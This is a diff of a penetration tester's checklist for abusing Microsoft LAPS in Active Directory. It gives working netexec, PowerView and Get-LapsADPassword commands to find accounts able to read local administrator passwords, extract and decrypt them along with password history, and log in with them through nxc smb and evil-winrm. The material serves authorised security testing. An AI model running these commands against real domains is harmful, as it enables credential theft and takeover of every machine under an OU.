@@ -1,25 +1,30 @@
-# LAPS Abuse
+# LAPS abuse
 
 ## Before I start
-- [ ] LAPS is deployed: look for ms-Mcs-AdmPwd (legacy) or msLAPS-Password (Windows LAPS) attributes on computer objects
-- [ ] An account with read rights on that attribute for some OU — often helpdesk or workstation admins
+- [ ] LAPS is deployed: ms-Mcs-AdmPwd, the legacy attribute, or msLAPS-Password, Windows LAPS, on computer objects
+- [ ] An account that may read that attribute for some OU, often helpdesk or workstation administrators
 
-## Find who can read it
-- [ ] BloodHound: the ReadLAPSPassword edge on each computer object
-- [ ] PowerView: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd|msLAPS-Password'}
+## Who can read it
+- [ ] BloodHound: the ReadLAPSPassword edge on each computer
+- [ ] With PowerView loaded, as in :Pb domain-enum: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd|msLAPS-Password'}
 
 ## Read the passwords
-nxc ldap <DCIP> -u '<Username>' -p '<Password>' --laps
-From a domain host with PowerView:
-Get-DomainComputer <TargetHost> -Properties ms-Mcs-AdmPwd
-Get-DomainComputer <TargetHost> -Properties 'msLAPS-Password','msLAPS-PasswordHistory'
-- [ ] Legacy attribute is plaintext in the LDAP response
-- [ ] Windows LAPS may store it encrypted: Get-LapsADPassword -Identity <TargetHost> -AsPlainText decrypts when I hold the right
-- [ ] msLAPS-PasswordHistory hands over the PREVIOUS passwords: still valid on boxes that missed rotation
+At the pwn-broker prompt: tool install netexec.
+nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M laps
+One computer only:
+nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M laps -o COMPUTER=<Hostname>
+From a domain host, with PowerView loaded:
+Get-DomainComputer <Hostname> -Properties ms-Mcs-AdmPwd
+Get-DomainComputer <Hostname> -Properties 'msLAPS-Password','msLAPS-PasswordHistory'
+- [ ] The legacy attribute is plain text in the answer
+- [ ] Windows LAPS may store it encrypted: Get-LapsADPassword -Identity <Hostname> -AsPlainText decrypts it for an account with the right
+- [ ] msLAPS-PasswordHistory gives the earlier passwords, still good on hosts that missed a rotation
 
 ## Use them
-nxc smb <TargetIP> -u 'Administrator' -p '<LapsPassword>' --local-auth
-evil-winrm -i <TargetIP> -u 'Administrator' -p '<LapsPassword>'
-- [ ] Local account, so --local-auth / no domain on the login
-- [ ] The delegation is the real target: whoever reads LAPS owns every box under that OU — if I can't read it myself, own someone who can: :Pb acl-abuse
-- [ ] Same LAPS password on several machines = broken rotation or a cloned image: try it fleet-wide, then report it
+nxc smb <TargetIP> -u Administrator -p 'THE-LAPS-PASSWORD' --local-auth
+evil-winrm -i <TargetIP> -u Administrator -p 'THE-LAPS-PASSWORD'
+- [ ] A local account: --local-auth, and no domain at the login
+Read and used in one step, by an account that may read it:
+nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --laps
+- [ ] Whoever may read LAPS owns every host under that OU: if I cannot read it, an account that can, :Pb acl-abuse
+- [ ] The same password on several machines: rotation is broken or the image was cloned, so tried on all of them, and written up
